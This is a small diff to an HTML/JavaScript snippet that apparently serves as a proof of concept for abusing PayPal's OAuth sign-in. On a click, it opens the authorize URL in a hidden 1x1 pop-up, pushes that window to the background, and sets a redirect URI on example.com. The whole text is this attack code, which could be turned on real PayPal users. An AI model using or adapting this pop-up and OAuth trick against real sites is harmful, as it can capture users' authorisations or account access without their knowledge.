@@ -1,5 +1,6 @@
 <script>
  function task() { 
+    document.getElementById("a1").innerText = "wait";
     x = window.open('https://www.paypal.com/signin/authorize?client_id=AWkSuVNfLPUoFB_mzMPA8QbMT8p3KB4glqw9UUIDfms-9X5aT2bDLsBd05b8xIACuye4x3cTB1hvTISO&response_type=code&scopex=profile%20email&redirect_uri=https://example.com/x','_blank','width=1,height=1,resizable=yes,scrollbars=yes');
     x.blur();
     window.focus();
@@ -11,4 +12,4 @@
 </script>
 <a href=# onclick="task();this.style='disaply:none;'">Click</a>
 <br>
-<a id=a1 href="">Wait</a>
+<a id=a1 href=""></a>
